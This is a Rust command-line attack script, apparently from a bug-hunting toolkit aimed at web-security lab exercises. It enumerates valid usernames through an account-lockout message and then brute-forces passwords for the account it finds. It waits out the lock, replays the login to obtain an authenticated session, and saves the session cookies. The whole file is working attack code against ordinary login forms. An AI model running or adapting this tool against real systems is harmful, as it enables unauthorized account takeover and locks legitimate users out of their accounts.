#!/usr/bin/env rust-script
//! name: acct_lock_enum
//! description: 账号锁定型用户名枚举与口令爆破件 - 对候选用户名逐个重复投递错误口令,以"锁定"提示是否出现判定账号存在(锁定逻辑缺陷:锁定只改提示、不阻断继续尝试),再对命中用户扫描候选口令;一个信封给出逐名分类序列、有效用户、中选口令、会话 cookie 与账户页复验
//! version: 1.3.0
//! args: <login-url> [--users FILE] [--attempts N] [--password S] [--user U] [--passwords FILE] [--jar PATH] [--out FILE] [--lock-wait-secs N] [--field-user username] [--field-pass password] [--lock-marker S] [--fail-marker S] [--confirm-path /my-account] [--snippet N] [--timeout-ms N] [--selftest]
//! keywords: 漏洞猎手套件, 用户名枚举, 账号锁定, account lock, enumeration, 爆破, 认证
//!
//! ```cargo
//! [dependencies]
//! ureq = { version = "2" }
//! url = "2"
//! ```

use pi_rust_lib::serde_json::{json, Value};
use std::collections::BTreeMap;
use std::time::{Duration, Instant};
use url::Url;

type Jar = BTreeMap<String, BTreeMap<String, String>>;

struct Cfg {
    url: String,
    users: Vec<String>,
    attempts: usize,
    password: String,
    user: Option<String>,
    passwords: Vec<String>,
    jar_path: Option<String>,
    field_user: String,
    field_pass: String,
    lock_marker: String,
    fail_marker: String,
    confirm_path: String,
    out: Option<String>,
    lock_wait_secs: u64,
    snippet: usize,
    timeout_ms: u64,
}

struct Reply {
    status: u16,
    location: String,
    set_cookies: Vec<String>,
    body: String,
    transport_err: Option<String>,
}

/// Which of the three observable outcomes this response is. `lock` proves the
/// username exists (the app locked a real account); `invalid` is the generic
/// rejection; `other` is anything else (a 3xx login success, a new message).
fn classify(status: u16, body: &str, lock_marker: &str, fail_marker: &str) -> &'static str {
    let low = body.to_lowercase();
    if !lock_marker.is_empty() && low.contains(&lock_marker.to_lowercase()) {
        return "lock";
    }
    if !fail_marker.is_empty() && low.contains(&fail_marker.to_lowercase()) {
        return "invalid";
    }
    if (300..400).contains(&status) {
        return "redirect";
    }
    "other"
}

fn main() {
    let args: Vec<String> = std::env::args().skip(1).collect();
    if args.iter().any(|a| a == "--selftest") {
        selftest();
        return;
    }
    let mut cfg = Cfg {
        url: String::new(),
        users: Vec::new(),
        attempts: 5,
        password: "wrongpassword".to_string(),
        user: None,
        passwords: Vec::new(),
        jar_path: None,
        field_user: "username".to_string(),
        field_pass: "password".to_string(),
        lock_marker: "too many incorrect login attempts".to_string(),
        fail_marker: "Invalid username or password".to_string(),
        confirm_path: "/my-account".to_string(),
        out: None,
        lock_wait_secs: 65,
        snippet: 200,
        timeout_ms: 20000,
    };
    let mut users_file: Option<String> = None;
    let mut pass_file: Option<String> = None;
    let mut i = 0;
    while i < args.len() {
        match args[i].as_str() {
            "--users" => { i += 1; users_file = Some(arg(&args, i)); }
            "--prop" => { i += 1; users_file = Some(arg(&args, i)); }
            "--attempts" => { i += 1; cfg.attempts = arg(&args, i).parse().unwrap_or(5).max(1); }
            "--password" => { i += 1; cfg.password = arg(&args, i); }
            "--user" => { i += 1; cfg.user = Some(arg(&args, i)); }
            "--passwords" => { i += 1; pass_file = Some(arg(&args, i)); }
            "--jar" => { i += 1; cfg.jar_path = Some(arg(&args, i)); }
            "--field-user" => { i += 1; cfg.field_user = arg(&args, i); }
            "--field-pass" => { i += 1; cfg.field_pass = arg(&args, i); }
            "--lock-marker" => { i += 1; cfg.lock_marker = arg(&args, i); }
            "--fail-marker" => { i += 1; cfg.fail_marker = arg(&args, i); }
            "--confirm-path" => { i += 1; cfg.confirm_path = arg(&args, i); }
            "--out" => { i += 1; cfg.out = Some(arg(&args, i)); }
            "--lock-wait-secs" => { i += 1; cfg.lock_wait_secs = arg(&args, i).parse().unwrap_or(65); }
            "--snippet" => { i += 1; cfg.snippet = arg(&args, i).parse().unwrap_or(200); }
            "--timeout-ms" => { i += 1; cfg.timeout_ms = arg(&args, i).parse().unwrap_or(20000); }
            other if !other.starts_with("--") && cfg.url.is_empty() => cfg.url = other.to_string(),
            _ => {}
        }
        i += 1;
    }
    if let Some(path) = users_file {
        match read_list(&path) {
            Ok(v) => cfg.users = v,
            Err(e) => {
                pi_rust_lib::report::failure("acct_lock_enum", &format!("cannot read --users {path}: {e}"), "fix the path");
                std::process::exit(2);
            }
        }
    }
    if let Some(path) = pass_file {
        match read_list(&path) {
            Ok(v) => cfg.passwords = v,
            Err(e) => {
                pi_rust_lib::report::failure("acct_lock_enum", &format!("cannot read --passwords {path}: {e}"), "fix the path");
                std::process::exit(2);
            }
        }
    }
    if cfg.url.is_empty() || (cfg.users.is_empty() && cfg.user.is_none() && cfg.passwords.is_empty()) {
        pi_rust_lib::report::failure(
            "acct_lock_enum",
            "missing url or payload",
            "usage: acct_lock_enum <login-url> [--users FILE] [--user U --passwords FILE] [--jar PATH]",
        );
        std::process::exit(2);
    }

    // Serial on purpose: account-lock state is server-side and per-user, so every
    // response must be classified before the next request is decided on.
    let agent = ureq::AgentBuilder::new()
        .timeout(Duration::from_millis(cfg.timeout_ms))
        .redirects(0)
        .build();
    let mut jar: Jar = cfg.jar_path.as_deref().map(load_jar).unwrap_or_default();
    let started = Instant::now();

    let mut enumerate_tail: Vec<Value> = Vec::new();
    let mut valid_user: Option<String> = None;
    let mut enum_requests = 0usize;
    let mut transport_errors = 0usize;

    for user in cfg.users.clone() {
        if valid_user.is_some() {
            break;
        }
        let mut classes: Vec<String> = Vec::new();
        let mut statuses: Vec<u16> = Vec::new();
        let mut first_other: Option<Value> = None;
        for _ in 0..cfg.attempts {
            let cookie = cookie_header(&jar, &cfg.url);
            let pairs = vec![
                (cfg.field_user.clone(), user.clone()),
                (cfg.field_pass.clone(), cfg.password.clone()),
            ];
            let reply = post(&agent, &cfg.url, &pairs, &cookie);
            enum_requests += 1;
            if let Some(e) = &reply.transport_err {
                transport_errors += 1;
                classes.push(format!("transport:{e}"));
                break;
            }
            let set: Vec<(String, String)> = reply.set_cookies.iter().filter_map(|c| split_cookie(c)).collect();
            apply_setcookies(&mut jar, &cfg.url, &set);
            let class = classify(reply.status, &reply.body, &cfg.lock_marker, &cfg.fail_marker);
            classes.push(class.to_string());
            statuses.push(reply.status);
            if class == "lock" {
                valid_user = Some(user.clone());
                break;
            }
            if class != "invalid" && first_other.is_none() {
                first_other = Some(json!({
                    "status": reply.status,
                    "location": reply.location,
                    "snippet": collapse(&reply.body, cfg.snippet),
                }));
            }
            if class == "redirect" {
                valid_user = Some(user.clone());
                break;
            }
        }
        enumerate_tail.push(json!({
            "user": user,
            "classes": classes,
            "statuses": statuses,
            "first_other": first_other,
        }));
    }

    let mut brute: Value = Value::Null;
    let mut jar_updated = false;
    let mut confirm: Value = Value::Null;
    let mut confirm_fresh: Value = Value::Null;    let mut hit: Option<Value> = None;
    let mut hit_password: Option<String> = None;
    let mut hit_body: Option<String> = None;
    let mut hit_raw: Option<Value> = None;
    if let Some(user) = cfg.user.clone().or_else(|| valid_user.clone()) {
        if !cfg.passwords.is_empty() {
            let mut tried = 0usize;
            let mut hist: BTreeMap<String, usize> = BTreeMap::new();
            let mut brute_tail: Vec<Value> = Vec::new();
            for pw in cfg.passwords.clone() {
                let cookie = cookie_header(&jar, &cfg.url);
                let pairs = vec![
                    (cfg.field_user.clone(), user.clone()),
                    (cfg.field_pass.clone(), pw.clone()),
                ];
                let reply = post(&agent, &cfg.url, &pairs, &cookie);
                tried += 1;
                if let Some(e) = &reply.transport_err {
                    transport_errors += 1;
                    *hist.entry("transport".to_string()).or_insert(0) += 1;
                    if brute_tail.len() < 12 {
                        brute_tail.push(json!({"password": pw, "transport": e}));
                    }
                    continue;
                }
                let set: Vec<(String, String)> = reply.set_cookies.iter().filter_map(|c| split_cookie(c)).collect();
                apply_setcookies(&mut jar, &cfg.url, &set);
                let class = classify(reply.status, &reply.body, &cfg.lock_marker, &cfg.fail_marker);
                *hist.entry(class.to_string()).or_insert(0) += 1;
                if class != "lock" && class != "invalid" {
                    hit = Some(json!({
                        "user": user,
                        "password": pw,
                        "class": class,
                        "status": reply.status,
                        "location": reply.location,
                        "set_cookie_names": set.iter().map(|(k, _)| k.clone()).collect::<Vec<_>>(),
                        "body_len": reply.body.len(),
                        "snippet": collapse(&reply.body, 400),
                    }));
                    // Keep the raw body: an "other" response is the whole
                    // evidence for a hit, and its shape (302 vs 200) decides
                    // whether the login actually issued a session.
                    hit_body = Some(reply.body.clone());
                    hit_password = Some(pw.clone());
                    hit_raw = Some(json!({
                        "status": reply.status,
                        "location": reply.location,
                        "set_cookie": reply.set_cookies,
                        "body": reply.body.clone(),
                    }));
                    brute_tail.push(json!({"password": pw, "class": class, "status": reply.status}));
                    break;
                }
                if brute_tail.len() < 12 {
                    brute_tail.push(json!({"password": pw, "class": class, "status": reply.status}));
                }
            }
            brute = json!({
                "user": user,
                "candidates": cfg.passwords.len(),
                "tried": tried,
                "class_histogram": hist.iter().map(|(k, v)| json!({"class": k, "count": v})).collect::<Vec<_>>(),
                "tail": brute_tail,
                "hit": hit,
            });
        }
    }

    if let (Some(path), Some(body)) = (cfg.out.as_deref(), hit_body.as_deref()) {
        let _ = std::fs::write(path, body);
    }
    if hit.is_some() {
        let target = match Url::parse(&cfg.url) {
            Ok(mut u) => {
                u.set_path(&cfg.confirm_path);
                u.set_query(None);
                u.to_string()
            }
            Err(_) => format!("{}{}", cfg.url.trim_end_matches('/'), cfg.confirm_path),
        };
        let follow = ureq::AgentBuilder::new()
            .timeout(Duration::from_millis(cfg.timeout_ms))
            .redirects(2)
            .build();
        let reply = get(&follow, &target, &cookie_header(&jar, &cfg.url));
        let authed = reply.body.contains("Your username is");
        confirm = json!({
            "path": cfg.confirm_path,
            "status": reply.status,
            "authed": authed,
            "snippet": collapse(&reply.body, cfg.snippet),
        });
        // A correct password inside the account-lock window renders the PLAIN
        // login page (no message, sometimes a fresh but unauthenticated cookie):
        // that is the hit oracle, but no session is issued until the lock's
        // one-minute timer expires. So the confirm can legitimately fail on the
        // first try - wait out the lock, then replay.
        if !authed {
            if let (Some(user), Some(pw)) = (cfg.user.clone().or_else(|| valid_user.clone()), hit_password.clone()) {
                let pairs = vec![
                    (cfg.field_user.clone(), user),
                    (cfg.field_pass.clone(), pw),
                ];
                if cfg.lock_wait_secs > 0 {
                    std::thread::sleep(Duration::from_secs(cfg.lock_wait_secs));
                }
                let mut fresh: Jar = Jar::new();
                let r1 = post(&agent, &cfg.url, &pairs, &cookie_header(&jar, &cfg.url));
                let set: Vec<(String, String)> = r1.set_cookies.iter().filter_map(|c| split_cookie(c)).collect();
                apply_setcookies(&mut fresh, &cfg.url, &set);
                let mut r2 = get(&follow, &target, &cookie_header(&fresh, &cfg.url));
                let mut authed_fresh = r2.body.contains("Your username is");
                let mut cookieless = false;
                if !authed_fresh {
                    // Cookie-less replay: the shape that issues a session when the
                    // loop's own jar carries a stale anonymous session.
                    cookieless = true;
                    let r3 = post(&agent, &cfg.url, &pairs, "");
                    let set3: Vec<(String, String)> = r3.set_cookies.iter().filter_map(|c| split_cookie(c)).collect();
                    apply_setcookies(&mut fresh, &cfg.url, &set3);
                    r2 = get(&follow, &target, &cookie_header(&fresh, &cfg.url));
                    authed_fresh = r2.body.contains("Your username is");
                }
                confirm_fresh = json!({
                    "waited_secs": cfg.lock_wait_secs,
                    "login_status": r1.status,
                    "login_location": r1.location,
                    "set_cookie_names": set.iter().map(|(k, _)| k.clone()).collect::<Vec<_>>(),
                    "cookieless_retry": cookieless,
                    "account_status": r2.status,
                    "authed": authed_fresh,
                    "snippet": collapse(&r2.body, cfg.snippet),
                });
                if authed_fresh {
                    jar = fresh;
                }
            }
        }
        if let Some(jar_path) = cfg.jar_path.as_deref() {
            if let Ok(text) = pi_rust_lib::serde_json::to_string(&jar) {
                jar_updated = std::fs::write(jar_path, text).is_ok();
            }
        }
    }

    let data = json!({
        "url": cfg.url,
        "attempts_per_user": cfg.attempts,
        "users_tested": enumerate_tail.len(),
        "enum_requests": enum_requests,
        "valid_user": valid_user,
        "enumerate_tail": enumerate_tail,
        "brute": brute,
        "hit_raw": hit_raw,
        "hit_body_out": cfg.out,
        "confirm": confirm,
        "confirm_fresh": confirm_fresh,
        "jar_updated": jar_updated,
        "transport_errors": transport_errors,
        "elapsed_ms": started.elapsed().as_millis() as u64,
    });
    let next = if hit.is_some() {
        "hit found: the jar holds the session - read the account page / run banner_verdict to confirm the lab verdict"
    } else if valid_user.is_none() {
        "no lock response seen; check --lock-marker text and raise --attempts"
    } else {
        "username pinned; rerun with --user and --passwords (and check the lock class histogram)"
    };
    pi_rust_lib::report::success("acct_lock_enum", data, next).expect("report success");
}

fn read_list(path: &str) -> std::io::Result<Vec<String>> {
    Ok(std::fs::read_to_string(path)?
        .lines()
        .map(str::trim)
        .filter(|l| !l.is_empty() && !l.starts_with('#'))
        .map(String::from)
        .collect())
}

fn arg(args: &[String], i: usize) -> String {
    args.get(i).cloned().unwrap_or_default()
}

fn collapse(text: &str, limit: usize) -> String {
    let one: String = text.split_whitespace().collect::<Vec<_>>().join(" ");
    if one.len() > limit {
        format!("{}...", &one[..limit.min(one.len())])
    } else {
        one
    }
}

fn form_body(pairs: &[(String, String)]) -> String {
    pairs
        .iter()
        .map(|(k, v)| format!("{}={}", urlencode(k), urlencode(v)))
        .collect::<Vec<_>>()
        .join("&")
}

fn urlencode(s: &str) -> String {
    let mut out = String::new();
    for b in s.bytes() {
        match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => out.push(b as char),
            _ => out.push_str(&format!("%{:02X}", b)),
        }
    }
    out
}

fn post(agent: &ureq::Agent, url: &str, pairs: &[(String, String)], cookie: &str) -> Reply {
    let mut req = agent.post(url).set("Content-Type", "application/x-www-form-urlencoded");
    if !cookie.is_empty() {
        req = req.set("Cookie", cookie);
    }
    match req.send_string(&form_body(pairs)) {
        Ok(r) | Err(ureq::Error::Status(_, r)) => read(r),
        Err(e) => Reply {
            status: 0,
            location: String::new(),
            set_cookies: Vec::new(),
            body: String::new(),
            transport_err: Some(e.to_string()),
        },
    }
}

fn get(agent: &ureq::Agent, url: &str, cookie: &str) -> Reply {
    let mut req = agent.get(url);
    if !cookie.is_empty() {
        req = req.set("Cookie", cookie);
    }
    match req.call() {
        Ok(r) | Err(ureq::Error::Status(_, r)) => read(r),
        Err(e) => Reply {
            status: 0,
            location: String::new(),
            set_cookies: Vec::new(),
            body: String::new(),
            transport_err: Some(e.to_string()),
        },
    }
}

fn read(r: ureq::Response) -> Reply {
    let status = r.status();
    let location = r.header("Location").unwrap_or("").to_string();
    let set_cookies: Vec<String> = r.all("Set-Cookie").iter().map(|s| s.to_string()).collect();
    let body = r.into_string().unwrap_or_default();
    Reply { status, location, set_cookies, body, transport_err: None }
}

fn host_of(url: &str) -> String {
    Url::parse(url).ok().and_then(|u| u.host_str().map(String::from)).unwrap_or_default()
}

fn cookie_header(jar: &Jar, url: &str) -> String {
    let host = host_of(url);
    let mut parts = Vec::new();
    for (h, cookies) in jar {
        if host == *h || host.ends_with(&format!(".{h}")) || h.ends_with(&host) {
            for (k, v) in cookies {
                parts.push(format!("{k}={v}"));
            }
        }
    }
    parts.join("; ")
}

fn apply_setcookies(jar: &mut Jar, url: &str, pairs: &[(String, String)]) -> bool {
    if pairs.is_empty() {
        return false;
    }
    let host = host_of(url);
    let key = jar
        .keys()
        .find(|h| **h == host || host.ends_with(&format!(".{h}")) || h.ends_with(&host))
        .cloned()
        .unwrap_or(host);
    let entry = jar.entry(key).or_default();
    for (k, v) in pairs {
        entry.insert(k.clone(), v.clone());
    }
    true
}

fn split_cookie(raw: &str) -> Option<(String, String)> {
    let first = raw.split(';').next()?.trim();
    let (k, v) = first.split_once('=')?;
    Some((k.trim().to_string(), v.trim().to_string()))
}

fn load_jar(path: &str) -> Jar {
    std::fs::read_to_string(path)
        .ok()
        .and_then(|s| pi_rust_lib::serde_json::from_str::<Value>(&s).ok())
        .and_then(|v| match v {
            Value::Object(hosts) => Some(
                hosts
                    .into_iter()
                    .map(|(h, c)| {
                        let map = c
                            .as_object()
                            .map(|o| o.iter().map(|(k, v)| (k.clone(), v.as_str().unwrap_or("").to_string())).collect())
                            .unwrap_or_default();
                        (h, map)
                    })
                    .collect(),
            ),
            _ => None,
        })
        .unwrap_or_default()
}

fn selftest() {
    let lock = "You have made too many incorrect login attempts. Please try again in 1 minute(s).";
    let invalid = "<p class=is-warning>Invalid username or password.</p>";
    let oracle = classify(200, lock, "too many incorrect login attempts", "Invalid username or password") == "lock";
    let generic = classify(200, invalid, "too many incorrect login attempts", "Invalid username or password") == "invalid";
    let redir = classify(302, "", "too many incorrect login attempts", "Invalid username or password") == "redirect";
    let body_ok = form_body(&[("username".into(), "a b".into())]) == "username=a%20b";
    let split_ok = split_cookie("session=zz; Secure") == Some(("session".to_string(), "zz".to_string()));
    let collapse_ok = collapse("a\n b", 10) == "a b";
    let clean = classify(200, "<p>Log out</p>", "too many incorrect login attempts", "Invalid username or password") == "other";
    let receipt = oracle && generic && redir && body_ok && split_ok && collapse_ok && clean;
    let data = json!({
        "selftest": if receipt {"ok"} else {"fail"},
        "lock_class": oracle,
        "invalid_class": generic,
        "redirect_class": redir,
        "form_body": body_ok,
        "split_cookie": split_ok,
        "collapse": collapse_ok,
        "clean_class": clean,
    });
    if receipt {
        pi_rust_lib::report::success("acct_lock_enum", data, "selftest passed; run against the login endpoint").expect("report");
    } else {
        pi_rust_lib::report::failure("acct_lock_enum", "selftest failed", "inspect the failing assertion flags");
        std::process::exit(1);
    }
}
